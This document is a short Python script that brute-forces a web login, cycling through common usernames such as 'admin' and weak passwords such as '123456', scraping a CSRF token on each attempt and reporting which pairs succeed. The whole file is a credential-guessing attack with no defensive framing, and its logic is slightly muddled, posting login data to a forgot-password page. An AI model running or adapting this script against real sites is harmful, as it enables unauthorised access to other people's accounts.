import requests
from bs4 import BeautifulSoup

# Set the URL of the forget password page
url = 'https://example.com/forgotpassword.php'

# Set the list of usernames to try
usernames = ['admin', 'user', 'test', 'guest']

# Set the list of passwords to try
passwords = ['password', '123456', 'qwerty', 'letmein', 'welcome']

# Loop through each username
for username in usernames:
    # Loop through each password
    for password in passwords:
        # Create a session to send requests
        session = requests.Session()
        
        # Get the initial page to get the CSRF token
        response = session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
        
        # Prepare the login data with the current username and password
        login_data = {
            'username': username,
            'password': password,
            'csrf_token': csrf_token
        }
        
        # Send a POST request to the login page with the login data
        response = session.post(url, data=login_data)
        
        # Check if the login was successful
        if 'Welcome' in response.text:
            print(f'Login successful with username: {username} and password: {password}')
            break
        else:
            print(f'Login failed with username: {username} and password: {password}')